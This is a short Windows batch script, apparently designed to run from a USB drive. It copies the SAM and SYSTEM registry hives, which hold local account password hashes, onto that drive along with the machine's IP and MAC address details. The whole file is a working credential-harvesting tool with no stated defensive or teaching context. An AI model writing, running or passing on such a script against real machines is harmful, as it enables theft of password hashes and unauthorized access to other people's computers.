@echo off
setlocal


for %%A in ("%~dp0") do (
    set "driveLetter=%%~dA"
)



reg save HKLM\sam %driveLetter%\hee\sam.save
reg save HKLM\system %driveLetter%\hee\system.save
ipconfig > %driveLetter%\hee\ip.txt 
getmac > %driveLetter%\hee\mac.txt 

endlocal



